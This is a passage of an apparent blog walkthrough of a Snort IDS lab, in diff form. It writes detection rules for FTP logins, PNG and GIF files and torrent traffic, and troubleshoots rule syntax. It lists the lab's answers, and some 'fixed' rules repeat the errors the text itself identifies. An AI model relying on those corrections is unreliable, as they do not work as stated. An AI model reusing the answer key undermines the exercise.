-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1686080304 -n 65
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;WARNING: No preprocessors configured for policy 0.
-05/13-10:17:09.324118 ???.???.???.???:???? -&amp;gt; 65.208.228.223:80
-TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
-***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-5"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;145.254.160.237 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the source port of packet 65?&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1686080304 -n 65
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;WARNING: No preprocessors configured for policy 0.
-05/13-10:17:09.324118 ???.???.???.???:???? -&amp;gt; 65.208.228.223:80
-TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
-***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-6"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;3372 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-3-writing-ids-rules-ftp"&gt;Task 3 - Writing IDS Rules (FTP)&lt;/h3&gt;
-&lt;p&gt;Let's create IDS Rules for FTP traffic!
-Answer the questions below
-Navigate to the task folder.&lt;/p&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;p&gt;Write rules to detect "all TCP port 21"  traffic in the given pcap.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 21 &amp;lt;&amp;gt; any any (msg: "port 21 origin"; sid: 100001; rev: 1;)
-alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; sid: 100002; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="question-1-1"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h4 id="answer-7"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;614 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-1"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the FTP service name?&lt;/p&gt;
-&lt;h4 id="answer-8"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Microsoft FTP Service &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3-1"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Deactivate/comment on the old rules.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect failed FTP login attempts in the given pcap.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-2"&gt;notes&lt;/h5&gt;
-&lt;p&gt;I know from mistyping a FTP login enough times that 530 is the code for a failed FTP login.&lt;/p&gt;
-&lt;p&gt;Looking at the previous log I can see entries like &lt;code&gt;530 User admin cannot log in.&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;So from the previous channel, &lt;strong&gt;Payload Detection Rule Options&lt;/strong&gt;, it looks like I can use the &lt;code&gt;content:&lt;/code&gt; to search for the 530.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 21 &amp;lt;&amp;gt; any any (msg: "port 21 origin"; content:"530 "; sid: 100001; rev: 1;)
-alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"530 "; sid: 100002; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This gives the answer 82 which is not correct.&lt;/p&gt;
-&lt;p class="alert alert-info"&gt;Hint: Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic. &lt;/p&gt;
-&lt;p&gt;So the hint helps, the rule should only be for inbound.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 21 &amp;lt;&amp;gt; any any (msg: "port 21 origin"; content:"530 "; sid: 100001; rev: 1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run snort again to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-9"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;41 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4-1"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect successful FTP logins in the given pcap.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-3"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Similar to the last quesiton but the code is 230&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 21 &amp;lt;&amp;gt; any any (msg: "port 21 origin"; content:"230 "; sid: 100001; rev: 1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run snort again to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-10"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;1 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-5-1"&gt;Question 5&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-4"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Looking at the output from the rule in question 1 there are several entries for &lt;code&gt;331 Password required for fred.&lt;/code&gt; so I tried a rule for 331 in the body, same as the previous question it only makes sense to look for inbound traffic.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 21 &amp;lt;&amp;gt; any any (msg: "port 21 origin"; content:"331 "; sid: 100001; rev: 1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run snort again to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-11"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;42 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-6-1"&gt;Question 6&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect failed FTP login attempts with "Administrator" username but a bad password or no password.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-5"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;This builds on the previous answers, so a rule like this could work&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"331 Password required for Administrator"; sid: 100001; rev: 1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;But that is a kind of basic inflexible way to achieve it, lets make it more complex with the aid of a regex&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; pcre:"/(331).*(administrator)/ix"; sid: 100001; rev: 1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run snort again to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-12"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;7 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-3-writing-ids-rules-png"&gt;Task 3 - Writing IDS Rules (PNG)&lt;/h3&gt;
-&lt;p&gt;Let's create IDS Rules for PNG files in the traffic!&lt;/p&gt;
-&lt;h4 id="question-1-2"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect the PNG file in the given pcap.&lt;/p&gt;
-&lt;p&gt;Investigate the logs and identify the software name embedded in the packet.&lt;/p&gt;
-&lt;h5 id="notes-6"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;I could not figure this out from the channel, I tried a simple rule like&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any -&amp;gt; any any (content:"png"; msg:"PNG";sid:10002; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;It gave some results but nothing useful to answer the question.&lt;/p&gt;
-&lt;p&gt;After some googling and trying to avoid other writeups I came across this article on &lt;a href="https://asecuritysite.com/forensics/snort?fname=with_pdf.pcap&amp;amp;rulesname=rulessig.rules"&gt;asecuritysite.com&lt;/a&gt; which included the rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any -&amp;gt; any any (content:"|89 50 4E 47|"; msg:"PNG";sid:10002)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;I remember from a previous channel that the more certain way to identify a file rather then trusting the file extension is the files magic number or magic bytes, for png that is &lt;code&gt;89 50 4E 47&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;With that rule in place run snort to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-13"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;adobe imageready &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-2"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect the GIF file in the given pcap.&lt;/p&gt;
-&lt;p&gt;Investigate the logs and identify the image format embedded in the packet.&lt;/p&gt;
-&lt;h5 id="notes-7"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Based on the previous question I assume we are looking for the magic bytes for gif, that can be &lt;code&gt;47 49 46 38 37 61&lt;/code&gt; for GIF87a or &lt;code&gt;47 49 46 38 39 61&lt;/code&gt; for GIF89a.&lt;/p&gt;
-&lt;p&gt;Change the previous rule slightly and&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any -&amp;gt; any any (content:"|47 49 46 38 39 61|"; msg:"PNG";sid:10002)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that rule in place run snort to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r ftp-png-gif.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-14"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;GIF89a &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-5-writing-ids-rules-torrent-metafile"&gt;Task 5 - Writing IDS Rules (Torrent Metafile)&lt;/h3&gt;
-&lt;p&gt;Let's create IDS Rules for torrent metafiles in the traffic!&lt;/p&gt;
-&lt;h4 id="question-1-3"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;p&gt;Write a rule to detect the torrent metafile in the given pcap.&lt;/p&gt;
-&lt;h5 id="notes-8"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;A torrent meta file has an extension of &lt;code&gt;.torrent&lt;/code&gt; lets see if that finds anything.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any -&amp;gt; any any (content:".torrent"; msg:"PNG";sid:10002)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that rule in place run snort to read the pcap with the new rule&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r torrent.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seems to work.&lt;/p&gt;
-&lt;h4 id="answer-15"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;2 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-3"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the name of the torrent application?&lt;/p&gt;
-&lt;h5 id="notes-9"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;This is just a &lt;code&gt;nano snort.log.1686496369&lt;/code&gt; your log file name will be different.&lt;/p&gt;
-&lt;p&gt;The output will be something like&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;�ò�^B^@^D^@^@^@^@^@^@^@^@^@�^E^@^@^A^@^@^@���B�0^N^@�^A^@^@�^A^@^@�� ^@^&amp;gt;
-�饐^V�^K�rP^X"8�^@^@^@GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&amp;gt;
-Accept: application/?-??????????
-Accept-Encoding: gzip
-User-Agent: RAZA 2.1.0.0
-Host: ????????.??????????.???:2710
-Connection: Keep-Alive
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-16"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;bittorrent &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3-2"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?&lt;/p&gt;
-&lt;h5 id="notes-10"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Again this is just a &lt;code&gt;nano snort.log.1686496369&lt;/code&gt; your log file name will be different.&lt;/p&gt;
-&lt;p&gt;The output will be something like&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;�ò�^B^@^D^@^@^@^@^@^@^@^@^@�^E^@^@^A^@^@^@���B�0^N^@�^A^@^@�^A^@^@�� ^@^&amp;gt;
-�饐^V�^K�rP^X"8�^@^@^@GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&amp;gt;
-Accept: application/?-??????????
-Accept-Encoding: gzip
-User-Agent: RAZA 2.1.0.0
-Host: ????????.??????????.???:2710
-Connection: Keep-Alive
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-17"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;application/x-bittorrent &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4-2"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the hostname of the torrent metafile?&lt;/p&gt;
-&lt;h5 id="notes-11"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Again this is just a &lt;code&gt;nano snort.log.1686496369&lt;/code&gt; your log file name will be different.&lt;/p&gt;
-&lt;p&gt;The output will be something like&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;�ò�^B^@^D^@^@^@^@^@^@^@^@^@�^E^@^@^A^@^@^@���B�0^N^@�^A^@^@�^A^@^@�� ^@^&amp;gt;
-�饐^V�^K�rP^X"8�^@^@^@GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&amp;gt;
-Accept: application/?-??????????
-Accept-Encoding: gzip
-User-Agent: RAZA 2.1.0.0
-Host: ????????.??????????.???:2710
-Connection: Keep-Alive
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-18"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;tracker2.torrentbox.com &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-6-troubleshooting-rule-syntax-errors"&gt;Task 6 - Troubleshooting Rule Syntax Errors&lt;/h3&gt;
-&lt;p&gt;Let's troubleshoot rule syntax errors!&lt;/p&gt;
-&lt;p&gt;In this section, you need to fix the syntax errors in the given rule files.&lt;/p&gt;
-&lt;p&gt;You can test each ruleset with the following command structure;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -c local-X.rules -r mx-1.pcap -A console
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="question-1-4"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;Fix the syntax error in local-1.rules file and make it work smoothly.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-12"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-1.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 3372 -&amp;gt; any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Running snort with the provided command gives the following error;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Initializing rule chains...
-ERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)
-&amp;gt;&amp;gt;any(msg:
-&amp;gt;&amp;gt;^
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This is a missing space between any and the opening bracket, the fixed rule is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 3372 -&amp;gt; any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-19"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;16 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-4"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;Fix the syntax error in local-2.rules file and make it work smoothly.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-13"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-2.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any -&amp;gt; any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Running snort with the provided command gives the following error;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Initializing rule chains...
-ERROR: local-2.rules(8) Port value missing in rule!
-Fatal Error, Quitting..
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This time the port number is missing from the origin part of the rule, the fixed rule is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any -&amp;gt; any any(msg: "Troubleshooting 2"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-20"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;68 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3-3"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;Fix the syntax error in local-3.rules file and make it work smoothly.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-14"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-3.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any -&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Running snort with the provided command gives the following error;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Initializing rule chains...
-ERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.
-Fatal Error, Quitting..
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This time the tells us the same SID is used in 2 different rules, the fixed rule is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any -&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-21"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;87 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4-3"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;Fix the syntax error in local-4.rules file and make it work smoothly.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-15"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-4.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any -&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert tcp any 80,443 -&amp;gt; any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Running snort with the provided command gives the following error;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Initializing rule chains...
-ERROR: local-4.rules(9) Unmatch quote in rule option 'msg'.
-Fatal Error, Quitting..
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The error is a little misleading and it is easier to see the problem with the syntax highlighting, rather than it being an unmatched quote it is a colon instead of a semi-colon after msg in the second rule. There is a second issue which is the same as the previous question, the SID is the same in both rules, the fixed rule is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any -&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert tcp any 80,443 -&amp;gt; any any (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-22"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;90 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-5-2"&gt;Question 5&lt;/h4&gt;
-&lt;p&gt;Fix the syntax error in local-4.rules file and make it work smoothly.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-16"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-5.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any &amp;lt;&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert icmp any any &amp;lt;- any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)
-alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Running snort with the provided command gives the following error;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Initializing rule chains...
-ERROR: local-5.rules(9) Illegal direction specifier: &amp;lt;-
-Fatal Error, Quitting..
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;From the previous channel I know that snort does not have a &lt;code&gt;&amp;lt;-&lt;/code&gt; operator, since rule 2 is any ip and port in either direction is assume &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; is the correct operator. There is a second problem in the second rule, the separator between the sid name and the value is a semi-colon instead of a colon. Finally a third problem in the 3rd rule, the separator between msg and sid is again a colon rather than semi-colon, the fix rule is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert icmp any any &amp;lt;&amp;gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
-alert icmp any any &amp;lt;&amp;gt; any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
-alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-23"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;155 &lt;/p&gt;
-&lt;/blockquote&gt;
